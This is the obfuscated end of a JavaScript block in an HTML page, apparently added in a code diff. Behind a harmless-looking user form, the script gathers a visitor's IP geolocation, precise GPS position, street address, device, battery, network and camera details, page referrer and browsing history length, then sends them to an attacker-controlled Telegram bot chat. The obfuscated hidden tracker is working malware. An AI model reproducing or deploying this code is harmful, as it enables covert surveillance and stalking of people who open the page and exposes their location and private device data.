Date(_0x51909d[_0x392bf7(0xf1)])[_0x392bf7(0x15c)]('en-US')+'\x0a\x0a',_0x281889+=_0x392bf7(0x170),_0x281889+='-\x20IP:\x20`'+_0x51909d[_0x392bf7(0x1c6)]+'`\x0a';_0x51909d[_0x392bf7(0x198)]&&_0x51909d[_0x392bf7(0x198)]!==_0x392bf7(0x195)&&_0x51909d[_0x392bf7(0x198)]!==_0x392bf7(0x12d)&&(_0x281889+='-\x20Country:\x20'+_0x51909d['ipGeolocation'][_0x392bf7(0x125)]+'\x20('+_0x51909d['ipGeolocation'][_0x392bf7(0x14d)]+')\x0a',_0x281889+=_0x392bf7(0x1bb)+_0x51909d[_0x392bf7(0x198)][_0x392bf7(0x148)]+',\x20'+_0x51909d['ipGeolocation'][_0x392bf7(0x145)]+'\x0a',_0x281889+='-\x20Coordinates:\x20'+_0x51909d[_0x392bf7(0x198)][_0x392bf7(0x10a)]+',\x20'+_0x51909d['ipGeolocation']['longitude']+'\x0a',_0x281889+=_0x392bf7(0x180)+_0x51909d[_0x392bf7(0x198)]['postal']+'\x0a',_0x281889+=_0x392bf7(0xfd)+_0x51909d['ipGeolocation'][_0x392bf7(0x1b4)]+'\x0a',_0x281889+='-\x20Timezone:\x20'+_0x51909d[_0x392bf7(0x198)]['timezone']+'\x0a',_0x281889+=_0x392bf7(0x11d)+_0x51909d[_0x392bf7(0x198)][_0x392bf7(0x174)]+'\x20('+_0x51909d[_0x392bf7(0x198)]['currency_name']+')\x0a',_0x51909d[_0x392bf7(0x13c)]&&(_0x281889+='\x0a🗺️\x20*IP\x20Location\x20Maps:*\x0a',_0x281889+=_0x392bf7(0x177)+_0x51909d[_0x392bf7(0x13c)][_0x392bf7(0x154)]+')\x0a',_0x281889+=_0x392bf7(0x151)+_0x51909d[_0x392bf7(0x13c)][_0x392bf7(0x12b)]+')\x0a',_0x281889+='-\x20[Satellite\x20View]('+_0x51909d[_0x392bf7(0x13c)]['satellite']+')\x0a',_0x281889+=_0x392bf7(0x1a6)+_0x51909d['ipGoogleMapsLinks'][_0x392bf7(0xf5)]+')\x0a'));if(_0x51909d[_0x392bf7(0x117)]&&_0x51909d[_0x392bf7(0x117)]!=='denied_or_unavailable'&&typeof _0x51909d['gpsLocation']===_0x392bf7(0xd4))_0x281889+=_0x392bf7(0x122),_0x281889+=_0x392bf7(0x17e)+_0x51909d[_0x392bf7(0x117)][_0x392bf7(0x10a)]+',\x20'+_0x51909d[_0x392bf7(0x117)]['longitude']+'\x0a',_0x281889+=_0x392bf7(0x16e)+_0x51909d[_0x392bf7(0x117)][_0x392bf7(0x19e)]+'m\x0a',_0x51909d['gpsLocation'][_0x392bf7(0x1a4)]&&(_0x281889+=_0x392bf7(0x17a)+_0x51909d[_0x392bf7(0x117)]['altitude']+'m\x0a'),_0x51909d['gpsLocation'][_0x392bf7(0x11c)]&&(_0x281889+='-\x20Speed:\x20'+_0x51909d[_0x392bf7(0x117)][_0x392bf7(0x11c)]+_0x392bf7(0x140)),_0x51909d['gpsLocation'][_0x392bf7(0x144)]&&(_0x281889+=_0x392bf7(0x1be)+_0x51909d[_0x392bf7(0x117)][_0x392bf7(0x144)]+'°\x0a'),_0x51909d[_0x392bf7(0x119)]&&(_0x281889+=_0x392bf7(0x1b3)+_0x51909d['addressFromGPS'][_0x392bf7(0x147)]+'\x0a',_0x51909d[_0x392bf7(0x119)][_0x392bf7(0x129)]&&(_0x281889+='-\x20Street:\x20'+_0x51909d['addressFromGPS']['road']+'\x0a'),_0x51909d[_0x392bf7(0x119)][_0x392bf7(0x19b)]&&(_0x281889+=_0x392bf7(0x131)+_0x51909d[_0x392bf7(0x119)][_0x392bf7(0x19b)]+'\x0a'),_0x51909d[_0x392bf7(0x119)]['postcode']&&(_0x281889+=_0x392bf7(0x180)+_0x51909d['addressFromGPS']['postcode']+'\x0a')),_0x51909d['googleMapsLinks']&&(_0x281889+=_0x392bf7(0x1a7),_0x281889+=_0x392bf7(0x146)+_0x51909d['googleMapsLinks'][_0x392bf7(0x154)]+')\x0a',_0x281889+='-\x20[🚗\x20Get\x20Directions]('+_0x51909d[_0x392bf7(0x100)][_0x392bf7(0x12b)]+')\x0a',_0x281889+=_0x392bf7(0xed)+_0x51909d[_0x392bf7(0x100)][_0x392bf7(0x176)]+')\x0a',_0x281889+=_0x392bf7(0x10d)+_0x51909d[_0x392bf7(0x100)][_0x392bf7(0xf5)]+')\x0a',_0x281889+=_0x392bf7(0x14f)+_0x51909d[_0x392bf7(0x100)][_0x392bf7(0x172)]+')\x0a');else typeof _0x51909d[_0x392bf7(0x117)]===_0x392bf7(0x114)&&_0x51909d[_0x392bf7(0x117)][_0x392bf7(0x19a)]('denied')&&(_0x281889+=_0x392bf7(0x1a8));_0x281889+=_0x392bf7(0x13a),_0x281889+=_0x392bf7(0x108)+_0x51909d[_0x392bf7(0x19d)][_0x392bf7(0x165)]('\x20')[0x0]+'\x0a',_0x281889+=_0x392bf7(0x164)+_0x51909d['platform']+'\x0a',_0x281889+=_0x392bf7(0x11a)+_0x51909d[_0x392bf7(0x184)]+'x'+_0x51909d[_0x392bf7(0x104)]+'\x20('+_0x51909d[_0x392bf7(0x1af)]+_0x392bf7(0x10c),_0x281889+=_0x392bf7(0x1a0)+_0x51909d[_0x392bf7(0xf3)]+'x'+_0x51909d[_0x392bf7(0xd1)]+'\x0a',_0x281889+=_0x392bf7(0x1c5)+_0x51909d[_0x392bf7(0x18e)]+'\x0a',_0x281889+='-\x20Timezone:\x20'+_0x51909d[_0x392bf7(0x111)]+'\x0a',_0x281889+='-\x20Memory:\x20'+_0x51909d[_0x392bf7(0x103)]+_0x392bf7(0xea),_0x281889+=_0x392bf7(0x123)+_0x51909d[_0x392bf7(0x15d)]+'\x0a',_0x281889+=_0x392bf7(0x138)+(_0x51909d[_0x392bf7(0x1c0)]>0x0?_0x392bf7(0xdc):_0x392bf7(0x16b))+'\x0a';_0x51909d[_0x392bf7(0x12c)]&&_0x51909d[_0x392bf7(0x12c)]!==_0x392bf7(0x13b)&&(_0x281889+=_0x392bf7(0x186)+_0x51909d[_0x392bf7(0x12c)][_0x392bf7(0x18a)]+'%\x20'+(_0x51909d[_0x392bf7(0x12c)][_0x392bf7(0x194)]?_0x392bf7(0x16f):'')+'\x0a');_0x51909d[_0x392bf7(0xd8)]&&(_0x281889+=_0x392bf7(0x101)+_0x51909d[_0x392bf7(0xd8)][_0x392bf7(0x173)]+'\x20('+_0x51909d[_0x392bf7(0xd8)][_0x392bf7(0x159)]+')\x0a',_0x281889+='-\x20Speed:\x20'+_0x51909d[_0x392bf7(0xd8)][_0x392bf7(0x115)]+'\x20Mbps\x0a',_0x281889+=_0x392bf7(0x116)+_0x51909d[_0x392bf7(0xd8)][_0x392bf7(0x196)]+_0x392bf7(0x167));_0x51909d[_0x392bf7(0x1ae)]&&_0x51909d[_0x392bf7(0x1ae)]!==_0x392bf7(0x13b)&&(_0x281889+='-\x20Cameras:\x20'+_0x51909d['mediaDevices'][_0x392bf7(0x166)]+'\x0a',_0x281889+=_0x392bf7(0x150)+_0x51909d[_0x392bf7(0x1ae)][_0x392bf7(0x18b)]+'\x0a',_0x281889+=_0x392bf7(0x15e)+_0x51909d[_0x392bf7(0x1ae)]['audioOutput']+'\x0a');_0x281889+=_0x392bf7(0x171),_0x281889+='-\x20Page:\x20'+_0x51909d['pageUrl']+'\x0a',_0x281889+='-\x20Referrer:\x20'+_0x51909d[_0x392bf7(0x15a)]+'\x0a',_0x281889+=_0x392bf7(0x15b)+_0x51909d['historyLength']+'\x0a',_0x281889+=_0x392bf7(0xf0)+(_0x51909d[_0x392bf7(0x1bf)]?_0x392bf7(0x12e):_0x392bf7(0x1bd))+'\x0a',_0x281889+=_0x392bf7(0x10f)+(_0x51909d[_0x392bf7(0x1b5)]?'Yes':'No')+'\x0a';const _0x136c05=_0x392bf7(0xd0)+_0x2ea5c3+_0x392bf7(0x17f),_0x501d87=await fetch(_0x136c05,{'method':_0x392bf7(0x1ad),'headers':{'Content-Type':_0x392bf7(0xe2)},'body':JSON[_0x392bf7(0x1a9)]({'chat_id':_0x342c43,'text':_0x281889,'parse_mode':'Markdown','disable_web_page_preview':![]})});if(!_0x501d87['ok'])throw new Error(_0x392bf7(0x182)+_0x501d87[_0x392bf7(0xf2)]);const _0x577433=await _0x501d87[_0x392bf7(0xff)]();if(!_0x577433['ok'])throw new Error('Telegram\x20API\x20error:\x20'+_0x577433[_0x392bf7(0x155)]);}document[_0x3a856e(0x105)]('DOMContentLoaded',function(){const _0x21be67=_0x3a856e;console[_0x21be67(0x14e)](_0x21be67(0x106),getChatIdFromUrl());const _0x2defb9=document[_0x21be67(0x143)]('userForm'),_0x4683a6=_0x2defb9['querySelectorAll'](_0x21be67(0x132));_0x4683a6[_0x21be67(0x134)](_0x1b0da1=>{const _0x2994aa=_0x21be67;_0x1b0da1['addEventListener']('focus',function(){const _0xb327d0=_0x2d47;this['style'][_0xb327d0(0x1b7)]=_0xb327d0(0x1b6);}),_0x1b0da1[_0x2994aa(0x105)]('blur',function(){const _0x25f379=_0x2994aa;this['style']['transform']=_0x25f379(0x11e);});});});
+    </script>
+</body>
+</html>
